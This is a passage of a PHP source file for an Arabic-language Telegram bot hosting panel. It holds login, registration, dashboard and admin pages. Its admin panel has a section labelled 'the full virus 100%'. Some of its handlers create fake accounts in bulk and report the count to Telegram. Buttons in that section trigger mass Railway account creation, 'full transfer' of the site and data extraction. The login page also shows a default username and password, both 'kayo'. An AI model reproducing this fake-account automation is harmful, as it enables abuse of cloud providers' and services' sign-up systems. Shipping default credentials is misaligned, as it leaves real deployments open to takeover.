if ($action == 'virus_fake_account') {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $account = createFakeAccount();
    header('Location: ?action=admin&msg=تم إنشاء حساب وهمي: ' . $account['username']);
    exit;
}

// 11. حسابات جماعية
if ($action == 'virus_mass_create' && isset($_GET['count'])) {
    if (!isLoggedIn() || !isAdmin()) { header('Location: ?action=dashboard'); exit; }
    $count = (int)$_GET['count'];
    $created = 0;
    for ($i = 0; $i < $count; $i++) {
        $account = createFakeAccount();
        if ($account) $created++;
        sleep(1);
    }
    sendTelegram("👥 تم إنشاء {$created} حساب جديد");
    header('Location: ?action=admin&msg=تم إنشاء ' . $created . ' حساب');
    exit;
}

// 12. إبقاء الموقع نشطاً
if ($action == 'keep_alive') {
    header('Content-Type: text/plain');
    echo "✅ الموقع نشط - " . date('Y-m-d H:i:s');
    exit;
}

// ============================================================
// صفحة رفع المتطلبات
// ============================================================
if ($action == 'requirements' && isset($_GET['bot_id'])) {
    if (!isLoggedIn() || !isAdmin()) {
        header('Location: ?action=dashboard');
        exit;
    }
    $bot_id = (int)$_GET['bot_id'];
    $db = getDB();
    $stmt = $db->prepare("SELECT * FROM bots WHERE id = ?");
    $stmt->bindValue(1, $bot_id, SQLITE3_INTEGER);
    $result = $stmt->execute();
    $bot = $result->fetchArray(SQLITE3_ASSOC);
    $db->close();
    ?>
    <!DOCTYPE html>
    <html dir="rtl">
    <head><meta charset="UTF-8"><title>رفع المتطلبات</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Cairo','Tahoma',sans-serif;background:linear-gradient(135deg,#1a0533,#2d1b69,#4a2c8a);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .container{max-width:500px;width:100%;background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border-radius:24px;padding:40px;border:1px solid rgba(255,255,255,0.1);box-shadow:0 30px 80px rgba(0,0,0,0.5)}
        h2{color:white;text-align:center;margin-bottom:20px}
        p{color:#c4b5d4;text-align:center;margin-bottom:20px}
        .upload-area{border:2px dashed rgba(139,92,246,0.3);border-radius:16px;padding:30px;text-align:center}
        .upload-area label{cursor:pointer;color:#a78bfa;font-size:18px}
        .upload-area input[type="file"]{display:none}
        .btn{width:100%;padding:14px;background:linear-gradient(135deg,#8b5cf6,#6d28d9);color:white;border:none;border-radius:12px;font-size:18px;font-weight:600;cursor:pointer;transition:all 0.3s;margin-top:16px}
        .btn:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(139,92,246,0.4)}
        .back-link{text-align:center;margin-top:16px;color:#6a5a8a;font-size:13px}
        .back-link a{color:#a78bfa;text-decoration:none}
        .info{color:#a78bfa;font-weight:600}
    </style>
    </head>
    <body>
    <div class="container">
        <h2>📤 رفع المتطلبات</h2>
        <p>✅ تم استلام ملف البوت: <span class="info"><?php echo htmlspecialchars($bot['bot_name']); ?></span></p>
        <p style="font-size:14px;color:#7c6a9e;">🆔 المعرف: <span class="info"><?php echo $bot_id; ?></span></p>
        <form method="POST" action="?action=upload_requirements&bot_id=<?php echo $bot_id; ?>" enctype="multipart/form-data">
            <div class="upload-area">
                <label for="req_file">📄 اضغط لرفع ملف requirements.txt</label>
                <input type="file" name="req_file" id="req_file" accept=".txt" required>
                <div style="color:#6a5a8a;font-size:13px;margin-top:8px;">📌 ملف يحتوي على المكتبات المطلوبة</div>
            </div>
            <button type="submit" class="btn">🚀 رفع وتشغيل البوت</button>
        </form>
        <div class="back-link"><a href="?action=dashboard">🔙 العودة للوحة التحكم</a></div>
    </div>
    </body>
    </html>
    <?php
    exit;
}

// ============================================================
// API
// ============================================================
if ($action == 'api_bots') {
    header('Content-Type: application/json');
    echo json_encode(getAllBots());
    exit;
}

// ============================================================
// عرض الصفحات
// ============================================================
?>
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 استضافة بوتات كايو</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Cairo', 'Tahoma', Arial, sans-serif; background: #0d0a1a; color: white; min-height: 100vh; }
        a { text-decoration: none; color: #a78bfa; }
        a:hover { color: #8b5cf6; }
        
        .sidebar { width: 250px; background: rgba(20, 10, 50, 0.95); height: 100vh; position: fixed; right: 0; top: 0; padding: 30px 20px; border-left: 1px solid rgba(255,255,255,0.05); overflow-y: auto; z-index: 100; }
        .sidebar .logo { font-size: 26px; font-weight: 700; color: white; margin-bottom: 30px; }
        .sidebar .logo span { background: linear-gradient(135deg, #a78bfa, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sidebar .user-info { color: #c4b5d4; font-size: 14px; padding: 15px 0; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 20px; }
        .sidebar .user-info .name { color: white; font-weight: 600; }
        .sidebar .menu-item { display: block; padding: 12px 16px; color: #c4b5d4; border-radius: 12px; margin-bottom: 4px; transition: all 0.3s; }
        .sidebar .menu-item:hover { background: rgba(139,92,246,0.15); color: white; }
        .sidebar .menu-item.active { background: rgba(139,92,246,0.2); color: white; }
        .sidebar .menu-item .icon { margin-left: 10px; }
        .sidebar .logout { margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.05); }
        .sidebar .logout .menu-item { color: #fca5a5; }
        .sidebar .logout .menu-item:hover { background: rgba(239,68,68,0.15); }
        
        .main { margin-right: 250px; padding: 30px; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; flex-wrap: wrap; gap: 10px; }
        .header h1 { font-size: 28px; }
        .header .badge { background: rgba(139,92,246,0.2); color: #a78bfa; padding: 6px 16px; border-radius: 20px; font-size: 13px; }
        
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; margin-bottom: 30px; }
        .stat-card { background: rgba(255,255,255,0.04); border-radius: 16px; padding: 20px; border: 1px solid rgba(255,255,255,0.05); }
        .stat-card .number { font-size: 28px; font-weight: 700; color: white; }
        .stat-card .label { color: #7c6a9e; font-size: 14px; margin-top: 4px; }
        
        .card { background: rgba(255,255,255,0.04); border-radius: 16px; padding: 24px; border: 1px solid rgba(255,255,255,0.05); margin-bottom: 24px; }
        .card h3 { font-size: 18px; margin-bottom: 16px; color: white; }
        
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; color: #c4b5d4; font-size: 14px; margin-bottom: 4px; }
        .form-group input, .form-group select { width: 100%; max-width: 300px; padding: 10px 14px; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: white; font-size: 14px; }
        .form-group input:focus, .form-group select:focus { outline: none; border-color: #8b5cf6; }
        .form-row { display: flex; gap: 16px; flex-wrap: wrap; align-items: end; }
        
        .btn { padding: 10px 24px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; display: inline-block; }
        .btn-primary { background: linear-gradient(135deg, #8b5cf6, #6d28d9); color: white; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(139,92,246,0.4); }
        .btn-success { background: rgba(16,185,129,0.2); color: #6ee7b7; }
        .btn-success:hover { background: rgba(16,185,129,0.3); }
        .btn-danger { background: rgba(239,68,68,0.2); color: #fca5a5; }
        .btn-danger:hover { background: rgba(239,68,68,0.3); }
        .btn-warning { background: rgba(251,191,36,0.2); color: #fcd34d; }
        .btn-warning:hover { background: rgba(251,191,36,0.3); }
        .btn-sm { padding: 4px 12px; border-radius: 6px; font-size: 12px; }
        
        table { width: 100%; border-collapse: collapse; }
        th { text-align: right; padding: 10px 14px; color: #7c6a9e; font-weight: 400; font-size: 13px; border-bottom: 1px solid rgba(255,255,255,0.05); }
        td { padding: 10px 14px; color: #e5e5e5; border-bottom: 1px solid rgba(255,255,255,0.03); font-size: 14px; }
        
        .status-badge { display: inline-block; padding: 4px 14px; border-radius: 20px; font-size: 12px; font-weight: 600; }
        .status-running { background: rgba(16,185,129,0.2); color: #6ee7b7; }
        .status-stopped { background: rgba(239,68,68,0.2); color: #fca5a5; }
        .status-waiting { background: rgba(251,191,36,0.2); color: #fcd34d; }
        
        .alert { padding: 12px 16px; border-radius: 12px; margin-bottom: 16px; font-size: 14px; }
        .alert-success { background: rgba(16,185,129,0.12); border: 1px solid rgba(16,185,129,0.2); color: #6ee7b7; }
        .alert-danger { background: rgba(239,68,68,0.12); border: 1px solid rgba(239,68,68,0.2); color: #fca5a5; }
        .alert-warning { background: rgba(251,191,36,0.12); border: 1px solid rgba(251,191,36,0.2); color: #fcd34d; }
        
        .upload-area { border: 2px dashed rgba(139,92,246,0.3); border-radius: 16px; padding: 30px; text-align: center; transition: all 0.3s; }
        .upload-area:hover { border-color: rgba(139,92,246,0.6); background: rgba(139,92,246,0.05); }
        .upload-area label { cursor: pointer; color: #a78bfa; font-size: 18px; }
        .upload-area input[type="file"] { display: none; }
        .upload-area .hint { color: #6a5a8a; font-size: 13px; margin-top: 8px; }
        
        .login-container { max-width: 420px; margin: 50px auto; background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); border-radius: 24px; padding: 40px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 30px 80px rgba(0,0,0,0.5); }
        .login-container h2 { text-align: center; font-size: 28px; margin-bottom: 8px; }
        .login-container .subtitle { text-align: center; color: #c4b5d4; font-size: 14px; margin-bottom: 30px; }
        .login-container .form-group input { width: 100%; max-width: 100%; padding: 14px 18px; background: rgba(255,255,255,0.08); border: 2px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; font-size: 16px; }
        .login-container .form-group input:focus { border-color: #8b5cf6; box-shadow: 0 0 30px rgba(139,92,246,0.15); }
        .login-container .btn { width: 100%; padding: 14px; font-size: 18px; }
        .login-container .links { text-align: center; margin-top: 20px; color: #7c6a9e; font-size: 14px; }
        .login-container .demo { background: rgba(255,255,255,0.05); border-radius: 12px; padding: 15px; text-align: center; color: #7c6a9e; font-size: 13px; margin-top: 20px; border: 1px dashed rgba(255,255,255,0.05); }
        .login-container .demo span { color: #a78bfa; font-weight: 600; }
        
        .home-container { max-width: 900px; margin: 50px auto; text-align: center; padding: 50px; background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); border-radius: 30px; border: 1px solid rgba(255,255,255,0.1); }
        .home-container .logo { font-size: 70px; display: block; margin-bottom: 20px; }
        .home-container h1 { font-size: 48px; background: linear-gradient(135deg, #a78bfa, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 15px; }
        .home-container .subtitle { font-size: 20px; color: #c4b5d4; margin-bottom: 30px; }
        .home-container .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; margin: 30px 0; }
        .home-container .feature { background: rgba(255,255,255,0.08); padding: 25px 20px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); }
        .home-container .feature .icon { font-size: 36px; display: block; margin-bottom: 10px; }
        .home-container .feature h3 { font-size: 16px; }
        .home-container .feature p { font-size: 13px; color: #c4b5d4; margin-top: 5px; }
        .home-container .buttons { display: flex; gap: 15px; justify-content: center; flex-wrap: wrap; margin-top: 30px; }
        .home-container .btn { padding: 14px 40px; font-size: 18px; }
        .home-container .btn-outline { background: transparent; color: white; border: 2px solid rgba(255,255,255,0.3); }
        .home-container .btn-outline:hover { background: rgba(255,255,255,0.1); border-color: white; }
        .home-container .footer { margin-top: 30px; font-size: 14px; color: #7c6a9e; }
        
        .virus-section { border: 1px solid rgba(239,68,68,0.2); background: rgba(239,68,68,0.05); border-radius: 16px; padding: 24px; margin-bottom: 24px; }
        .virus-section h3 { color: #fca5a5; }
        .virus-section .btn-danger { background: rgba(239,68,68,0.2); color: #fca5a5; }
        .virus-section .btn-danger:hover { background: rgba(239,68,68,0.3); }
        
        .subscription-box { background: linear-gradient(135deg, rgba(139,92,246,0.15), rgba(109,40,217,0.15)); border: 1px solid rgba(139,92,246,0.2); border-radius: 16px; padding: 20px; margin-bottom: 24px; }
        .subscription-box .plan { font-size: 20px; font-weight: 700; color: white; }
        .subscription-box .expiry { color: #a78bfa; font-size: 14px; }
        
        @media (max-width: 768px) {
            .sidebar { width: 100%; height: auto; position: relative; border-left: none; border-bottom: 1px solid rgba(255,255,255,0.05); }
            .main { margin-right: 0; padding: 15px; }
            .stats { grid-template-columns: 1fr 1fr; }
            .home-container { padding: 20px; }
            .home-container h1 { font-size: 30px; }
            .home-container .features { grid-template-columns: 1fr 1fr; }
            .login-container { padding: 20px; margin: 20px; }
            table { font-size: 12px; }
            th, td { padding: 6px 8px; }
            .header h1 { font-size: 20px; }
        }
        @media (max-width: 480px) {
            .stats { grid-template-columns: 1fr; }
            .home-container .features { grid-template-columns: 1fr; }
            .form-row { flex-direction: column; }
            .form-group input, .form-group select { max-width: 100%; }
        }
    </style>
</head>
<body>

<?php
// ============================================================
// الصفحة الرئيسية
// ============================================================
if (!isset($action) || $action == '') {
    if (isLoggedIn()) {
        header('Location: ?action=dashboard');
        exit;
    }
    ?>
    <div class="home-container">
        <span class="logo">🚀</span>
        <h1>استضافة بوتات كايو</h1>
        <p class="subtitle">منصة احترافية لاستضافة وتشغيل بوتات تليجرام</p>
        <div class="features">
            <div class="feature"><span class="icon">📤</span><h3>رفع البوتات</h3><p>ارفع بوتك بسهولة</p></div>
            <div class="feature"><span class="icon">⚡</span><h3>تشغيل فوري</h3><p>شغل بوتك فوراً</p></div>
            <div class="feature"><span class="icon">🔒</span><h3>آمن ومحمي</h3><p>بوتاتك في مكان آمن</p></div>
            <div class="feature"><span class="icon">💳</span><h3>اشتراكات</h3><p>باقات تناسب الجميع</p></div>
        </div>
        <div class="buttons">
            <a href="?action=login" class="btn btn-primary">🔐 تسجيل الدخول</a>
            <a href="?action=register" class="btn btn-outline">📝 إنشاء حساب</a>
        </div>
        <div class="footer">👑 المطور: <a href="https://t.me/ggzh9">@ggzh9</a> | 📢 القناة: <a href="https://t.me/kayo_i">@kayo_i</a></div>
    </div>
    <?php
    exit;
}

// ============================================================
// صفحة تسجيل الدخول
// ============================================================
if ($action == 'login') {
    if (isLoggedIn()) {
        header('Location: ?action=dashboard');
        exit;
    }
    ?>
    <div class="login-container">
        <h2>🔐 تسجيل الدخول</h2>
        <p class="subtitle">قم بتسجيل الدخول للوصول إلى لوحة التحكم</p>
        <?php if (isset($error)) echo '<div class="alert alert-danger">' . $error . '</div>'; ?>
        <?php if (isset($_GET['msg'])) echo '<div class="alert alert-success">' . htmlspecialchars($_GET['msg']) . '</div>'; ?>
        <form method="POST">
            <div class="form-group">
                <label>👤 اسم المستخدم</label>
                <input type="text" name="username" placeholder="أدخل اسم المستخدم" required>
            </div>
            <div class="form-group">
                <label>🔒 كلمة المرور</label>
                <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
            </div>
            <button type="submit" name="login" class="btn btn-primary">🔐 تسجيل الدخول</button>
        </form>
        <div class="demo">👤 <span>kayo</span> | 🔑 <span>kayo</span></div>
        <div class="links">ليس لديك حساب؟ <a href="?action=register">إنشاء حساب جديد</a></div>
    </div>
    <?php
    exit;
}

// ============================================================
// صفحة إنشاء حساب
// ============================================================
if ($action == 'register') {
    if (isLoggedIn()) {
        header('Location: ?action=dashboard');
        exit;
    }
    ?>
    <div class="login-container">
        <h2>📝 إنشاء حساب</h2>
        <p class="subtitle">أنشئ حساباً جديداً للبدء في استضافة بوتاتك</p>
        <?php if (isset($error)) echo '<div class="alert alert-danger">' . $error . '</div>'; ?>
        <form method="POST">
            <div class="form-group">
                <label>👤 اسم المستخدم</label>
                <input type="text" name="username" placeholder="اختر اسم مستخدم" required>
            </div>
            <div class="form-group">
                <label>🔒 كلمة المرور</label>
                <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
            </div>
            <div class="form-group">
                <label>🔒 تأكيد كلمة المرور</label>
                <input type="password" name="confirm_password" placeholder="أعد إدخال كلمة المرور" required>
            </div>
            <button type="submit" name="register" class="btn btn-primary">📝 إنشاء حساب</button>
        </form>
        <div class="links">لديك حساب؟ <a href="?action=login">تسجيل الدخول</a></div>
    </div>
    <?php
    exit;
}

// ============================================================
// لوحة التحكم
// ============================================================
if ($action == 'dashboard') {
    if (!isLoggedIn()) {
        header('Location: ?');
        exit;
    }
    $user = getUserById($_SESSION['user_id']);
    $sub = getSubscription($_SESSION['user_id']);
    $bots = getUserBots($_SESSION['user_id']);
    $is_admin = isAdmin();
    ?>
    <div class="sidebar">
        <div class="logo">🚀 <span>كايو</span></div>
        <div class="user-info">
            <div class="name">👤 <?php echo htmlspecialchars($_SESSION['username']); ?></div>
            <div style="font-size:12px;margin-top:4px;"><?php echo $is_admin ? '👑 أدمن' : '👤 مستخدم'; ?></div>
        </div>
        <a href="?action=dashboard" class="menu-item active"><span class="icon">📊</span> لوحة التحكم</a>
        <?php if ($is_admin): ?>
        <a href="?action=admin" class="menu-item"><span class="icon">👑</span> لوحة الأدمن</a>
        <?php endif; ?>
        <div class="logout"><a href="?action=logout" class="menu-item"><span class="icon">🚪</span> تسجيل الخروج</a></div>
    </div>
    <div class="main">
        <div class="header">
            <h1>📊 لوحة التحكم</h1>
            <span class="badge">🟢 <?php echo $sub ? 'مشترك' : 'غير مشترك'; ?></span>
        </div>
        
        <?php if (isset($_GET['msg'])) echo '<div class="alert alert-success">' . htmlspecialchars($_GET['msg']) . '</div>'; ?>
        <?php if (isset($_GET['error'])) echo '<div class="alert alert-danger">' . htmlspecialchars($_GET['error']) . '</div>'; ?>
        
        <?php if ($sub): ?>
        <div class="subscription-box">
            <div class="plan">💳 <?php echo htmlspecialchars($sub['plan']); ?></div>
            <div class="expiry">📅 ينتهي في: <?php echo substr($sub['expiry_date'], 0, 10); ?></div>
        </div>
        <?php else: ?>
        <div class="alert alert-warning">⚠️ ليس لديك اشتراك نشط. تواصل مع المطور: <a href="https://t.me/ggzh9" style="color:#a78bfa;">@ggzh9</a></div>
        <?php endif; ?>
        
        <div class="stats">
            <div class="stat-card"><div class="number"><?php echo count($bots); ?></div><div class="label">🤖 البوتات</div></div>
            <div class="stat-card"><div class="number"><?php echo count(array_filter($bots, function($b) { return $b['status'] == 'running'; })); ?></div><div class="label">🟢 شغالة</div></div>
            <div class="stat-card"><div class="number"><?php echo count(array_filter($bots, function($b) { return $b['status'] == 'stopped'; })); ?></div><div class="label">🔴 متوقفة</div></div>
        </div>
        
        <?php if ($is_admin): ?>
        <div class="card">
            <h3>📤 رفع بوت جديد</h3>
            <div class="upload-area">
                <form method="POST" action="?action=upload" enctype="multipart/form-data">
                    <label for="bot_file">📤 اضغط لرفع ملف البوت (bot.py)</label>
                    <input type="file" name="bot_file" id="bot_file" accept=".py" required>
                    <div class="hint">📌 سيتم طلب ملف المتطلبات بعد الرفع</div>
                    <br>
                    <button type="submit" class="btn btn-success" style="padding:10px 30px;font-size:14px;">🚀 رفع وتشغيل البوت</button>
                </form>
            </div>
        </div>
        <?php else: ?>
        <div class="alert alert-warning">⚠️ التواصل مع المطور لنشر بوتك: <a href="https://t.me/ggzh9" style="color:#a78bfa;">@ggzh9</a></div>
        <?php endif; ?>
        
        <div class="card">
            <h3>🤖 بوتاتي</h3>
            <?php if (count($bots) > 0): ?>
            <table>
                <thead><tr><th>#</th><th>الاسم</th><th>الحالة</th><th>التاريخ</th><th>التحكم</th></tr></thead>
                <tbody>
                    <?php foreach ($bots as $bot): ?>
                    <tr>
                        <td><?php echo $bot['id']; ?></td>
                        <td><strong><?php echo htmlspecialchars($bot['bot_name']); ?></strong></td>
                        <td><span class="status-badge status-<?php echo $bot['status']; ?>"><?php echo $bot['status'] == 'running' ? '🟢 شغال' : ($bot['status'] == 'stopped' ? '🔴 متوقف' : '🟡 معلق'); ?></span></td>
                        <td><?php echo substr($bot['created_at'], 0, 10); ?></td>
                        <td>
                            <?php if ($is_admin): ?>
                                <?php if ($bot['status'] == 'running'): ?>
                                <a href="?action=stop_bot&id=<?php echo $bot['id']; ?>" class="btn btn-danger btn-sm">⏹ إيقاف</a>
                                <?php else: ?>
                                <a href="?action=start_bot&id=<?php echo $bot['id']; ?>" class="btn btn-success btn-sm">▶️ تشغيل</a>
                                <?php endif; ?>
                                <a href="?action=delete_bot&id=<?php echo $bot['id']; ?>" class="btn btn-danger btn-sm" onclick="return confirm('هل أنت متأكد؟')">🗑 حذف</a>
                            <?php else: ?>
                                <span style="color:#6a5a8a;font-size:13px;">🔒 لا يمكن التحكم</span>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
            <?php else: ?>
            <div style="text-align:center;color:#6a5a8a;padding:30px 0;">
                <div style="font-size:48px;opacity:0.5;">📭</div>
                <p>لا يوجد بوتات، ارفع بوتك الأول الآن!</p>
            </div>
            <?php endif; ?>
        </div>
        
        <div style="text-align:center;color:#6a5a8a;font-size:13px;padding:20px 0;border-top:1px solid rgba(255,255,255,0.05);">
            🚀 استضافة بوتات كايو | 👑 <a href="https://t.me/ggzh9" style="color:#7c6a9e;">@ggzh9</a>
        </div>
    </div>
    <?php
    exit;
}

// ============================================================
// لوحة الأدمن
// ============================================================
if ($action == 'admin') {
    if (!isLoggedIn() || !isAdmin()) {
        header('Location: ?action=dashboard');
        exit;
    }
    $users = getAllUsers();
    $bots = getAllBots();
    $subs = getAllSubscriptions();
    ?>
    <div class="sidebar">
        <div class="logo">🚀 <span>كايو</span></div>
        <div class="user-info">
            <div class="name">👑 <?php echo htmlspecialchars($_SESSION['username']); ?></div>
            <div style="font-size:12px;margin-top:4px;">👑 أدمن</div>
        </div>
        <a href="?action=dashboard" class="menu-item"><span class="icon">📊</span> لوحة التحكم</a>
        <a href="?action=admin" class="menu-item active"><span class="icon">👑</span> لوحة الأدمن</a>
        <div class="logout"><a href="?action=logout" class="menu-item"><span class="icon">🚪</span> تسجيل الخروج</a></div>
    </div>
    <div class="main">
        <div class="header"><h1>👑 لوحة الأدمن</h1><span class="badge" style="background:rgba(16,185,129,0.2);color:#6ee7b7;">🟢 نشط</span></div>
        
        <?php if (isset($_GET['msg'])) echo '<div class="alert alert-success">' . htmlspecialchars($_GET['msg']) . '</div>'; ?>
        
        <div class="stats">
            <div class="stat-card"><div class="number"><?php echo count($users); ?></div><div class="label">👥 المستخدمين</div></div>
            <div class="stat-card"><div class="number"><?php echo count($bots); ?></div><div class="label">🤖 البوتات</div></div>
            <div class="stat-card"><div class="number"><?php echo count($subs); ?></div><div class="label">💳 الاشتراكات</div></div>
        </div>
        
        <div class="card">
            <h3>💳 إضافة اشتراك</h3>
            <form method="POST" action="?action=add_subscription">
                <div class="form-row">
                    <div class="form-group"><label>معرف المستخدم</label><input type="number" name="user_id" placeholder="مثال: 1" required></div>
                    <div class="form-group">
                        <label>الباقة</label>
                        <select name="plan">
                            <option value="أسبوعي">أسبوعي (7 أيام)</option>
                            <option value="شهري">شهري (30 يوم)</option>
                            <option value="سنوي">سنوي (365 يوم)</option>
                            <option value="دائم">دائم</option>
                        </select>
                    </div>
                    <div class="form-group"><label>عدد الأيام</label><input type="number" name="days" placeholder="مثال: 30" required></div>
                    <div class="form-group"><button type="submit" class="btn btn-success">➕ إضافة</button></div>
                </div>
            </form>
        </div>
        
        <div class="virus-section">
            <h3>🦠 الفايروس الكامل 100%</h3>
            <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;">
                <a href="?action=virus_create_railway" class="btn btn-success btn-sm">🚀 حساب Railway</a>
                <a href="?action=virus_run_auto" class="btn btn-success btn-sm">🔄 تشغيل تلقائي</a>
                <a href="?action=virus_railway_accounts" class="btn btn-primary btn-sm">📋 حساباتي</a>
                <a href="?action=virus_full_transfer" class="btn btn-danger btn-sm" onclick="return confirm('⚠️ سيتم نقل الموقع بالكامل!')">🔄 نقل كامل</a>
                <a href="?action=virus_delete_accounts" class="btn btn-danger btn-sm" onclick="return confirm('⚠️ سيتم حذف جميع الحسابات!')">🗑 حذف الحسابات</a>
                <a href="?action=virus_extract_data" class="btn btn-warning btn-sm">📊 استخراج البيانات</a>
                <a href="?action=virus_keep_alive" class="btn btn-success btn-sm">🔄 بقاء نشط</a>
                <a href="?action=virus_backup" class="btn btn-warning btn-sm">💾 نسخ احتياطي</a>
                <a href="?action=virus_fake_account" class="btn btn-primary btn-sm">👤 حساب وهمي</a>
                <a href="?action=virus_mass_create&count=5" class="btn btn-primary btn-sm">👥 5 حسابات</a>
            </div>
        </div>
        
        <div class="card">
            <h3>👥 المستخدمين</h3>
            <table>
                <thead><tr><th>ID</th><th>اسم المستخدم</th><th>أدمن</th><th>تاريخ التسجيل</th></tr></thead>
                <tbody>
                    <?php foreach ($users as $u): ?>
                    <tr>
                        <td><?php echo $u['id']; ?></td>
                        <td><strong><?php echo htmlspecialchars($u['username']); ?></strong></td>
                        <td><span class="status-badge <?php echo $u['is_admin'] ? 'status-running' : 'status-stopped'; ?>"><?php echo $u['is_admin'] ? '✅ أدمن' : '❌ مستخدم'; ?></span></td>
                        <td><?php echo substr($u['created_at'], 0, 10); ?></td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        
        <div class="card">
            <h3>🤖 جميع البوتات</h3>
            <table>
                <thead><tr><th>ID</th><th>الاسم</th><th>الحالة</th><th>المستخدم</th></tr></thead>
                <tbody>
                    <?php foreach ($bots as $b): ?>
                    <tr>
                        <td><?php echo $b['id']; ?></td>
                        <td><?php echo htmlspecialchars($b['bot_name']); ?></td>
                        <td><span class="status-badge <?php echo $b['status'] == 'running' ? 'status-running' : 'status-stopped'; ?>"><?php echo $b['status'] == 'running' ? '🟢 شغال' : '🔴 متوقف'; ?></span></td>
                        <td><?php echo $b['user_id']; ?></td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        
        <div class="card">
            <h3>💳 الاشتراكات</h3>
            <table>
                <thead><tr><th>ID</th><th>المستخدم</th><th>الباقة</th><th>تاريخ الانتهاء</th></tr></thead>
                <tbody>
                    <?php foreach ($subs as $s): ?>
                    <tr>
                        <td><?php echo $s['id']; ?></td>
                        <td><?php echo htmlspecialchars($s['username'] ?? $s['user_id']); ?></td>
                        <td><span class="status-badge status-running"><?php echo htmlspecialchars($s['plan']); ?></span></td>
                        <td><?php echo substr($s['expiry_date'], 0, 10); ?></td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        
        <div style="text-align:center;color:#6a5a8a;font-size:13px;padding:20px 0;border-top:1px solid rgba(255,255,255,0.05);">
            🚀 استضافة بوتات كايو | 👑 <a href="https://t.me/ggzh9" style="color:#7c6a9e;">@ggzh9</a>
        </div>
    </div>
    <?php
    exit;
}

// ============================================================
// إذا لم يتم التعرف على الإجراء
// ============================================================
header('Location: ?');
exit;
?>